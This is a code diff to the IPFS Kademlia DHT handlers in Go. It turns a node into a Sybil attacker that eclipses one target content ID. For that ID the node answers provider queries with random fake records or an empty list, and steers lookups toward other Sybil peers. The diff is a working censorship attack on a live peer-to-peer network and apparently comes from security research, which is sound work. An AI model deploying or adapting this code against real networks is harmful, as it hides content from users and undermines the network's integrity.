@@ -5,6 +5,7 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"github.com/ipfs/go-cid"
 	"time"
 
 	"github.com/libp2p/go-libp2p/core/peer"
@@ -298,7 +299,13 @@ func (dht *IpfsDHT) handleFindPeer(ctx context.Context, from peer.ID, pmes *pb.M
 		}
 	}
 
-	resp.CloserPeers = pb.PeerInfosToPBPeers(dht.host.Network(), withAddresses)
+	cidCast, _ := cid.Cast(pmes.GetKey())
+	if EclipsedCid == cidCast.String() && len(OtherSybils) != 0 {
+		resp.CloserPeers = pb.PeerInfosToPBPeers(dht.host.Network(), OtherSybils)
+	} else {
+		resp.CloserPeers = pb.PeerInfosToPBPeers(dht.host.Network(), withAddresses)
+	}
+
 	return resp, nil
 }
 
@@ -312,28 +319,49 @@ func (dht *IpfsDHT) handleGetProviders(ctx context.Context, p peer.ID, pmes *pb.
 
 	resp := pb.NewMessage(pmes.GetType(), pmes.GetKey(), pmes.GetClusterLevel())
 
-	// setup providers
-	providers, err := dht.providerStore.GetProviders(ctx, key)
-	if err != nil {
-		return nil, err
-	}
+	cidCast, _ := cid.Cast(pmes.GetKey())
+	if EclipsedCid != cidCast.String() {
+		// Normal provide if not attacked
+		providers, err := dht.providerStore.GetProviders(ctx, key)
+		if err != nil {
+			return nil, err
+		}
 
-	filtered := make([]peer.AddrInfo, len(providers))
-	for i, provider := range providers {
-		filtered[i] = peer.AddrInfo{
-			ID:    provider.ID,
-			Addrs: dht.filterAddrs(provider.Addrs),
+		filtered := make([]peer.AddrInfo, len(providers))
+		for i, provider := range providers {
+			filtered[i] = peer.AddrInfo{
+				ID:    provider.ID,
+				Addrs: dht.filterAddrs(provider.Addrs),
+			}
+		}
+
+		resp.ProviderPeers = pb.PeerInfosToPBPeers(dht.host.Network(), filtered)
+	} else {
+		// Attack the content actively or passively
+		if IsActive {
+			fmt.Printf("[%s] ", time.Now().Format(time.RFC3339))
+			fmt.Println("Answering 10 random ProviderRecords to peer", p.String(), "about", cidCast.String()+"...")
+
+			resp.ProviderPeers = pb.PeerInfosToPBPeers(dht.host.Network(), RandomProviders)
+		} else {
+			fmt.Printf("[%s] ", time.Now().Format(time.RFC3339))
+			fmt.Println("Answering empty provider list to peer", p.String(), "about", cidCast.String()+"...")
+		}
+
+		// Update the best peers to query
+		if len(OtherSybils) != 0 {
+			resp.CloserPeers = pb.PeerInfosToPBPeers(dht.host.Network(), OtherSybils)
 		}
 	}
 
-	resp.ProviderPeers = pb.PeerInfosToPBPeers(dht.host.Network(), filtered)
-
-	// Also send closer peers.
-	closer := dht.betterPeersToQuery(pmes, p, dht.bucketSize)
-	if closer != nil {
-		// TODO: pstore.PeerInfos should move to core (=> peerstore.AddrInfos).
-		infos := pstore.PeerInfos(dht.peerstore, closer)
-		resp.CloserPeers = pb.PeerInfosToPBPeers(dht.host.Network(), infos)
+	if resp.CloserPeers == nil {
+		// If not attacked, normally send better peers.
+		closer := dht.betterPeersToQuery(pmes, p, dht.bucketSize)
+		if closer != nil {
+			// TODO: pstore.PeerInfos should move to core (=> peerstore.AddrInfos).
+			infos := pstore.PeerInfos(dht.peerstore, closer)
+			resp.CloserPeers = pb.PeerInfosToPBPeers(dht.host.Network(), infos)
+		}
 	}
 
 	return resp, nil
